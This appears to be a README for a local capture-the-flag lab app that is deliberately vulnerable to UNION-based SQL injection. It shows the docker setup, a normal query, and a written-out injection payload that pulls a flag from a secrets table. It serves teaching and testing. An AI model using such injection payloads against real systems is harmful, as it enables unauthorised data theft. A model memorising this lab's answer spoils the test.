# SQLi (UNION-based) CTF

Build:

```sh
docker build -t target-sqli-app .
```

Run:

```sh
docker run -d -p 5000:5000 --name sqli_target target-sqli-app
```

### App usage:

Request:

```sh
curl "http://localhost:5000/user?id=1"
```


Response:
```json
{"data":[{"id":1,"role":"administrator","username":"admin"}],"status":"success"}
```

### SQLi (UNION-based) test:

Request:

```sh
curl "http://localhost:5000/user?id=-1%20UNION%20SELECT%201,flag,3%20FROM%20secrets"
```

Response:

```json
{"data":[{"id":1,"role":"3","username":"CTF{SQLi_Master_Agent_2026}"}],"status":"success"}
```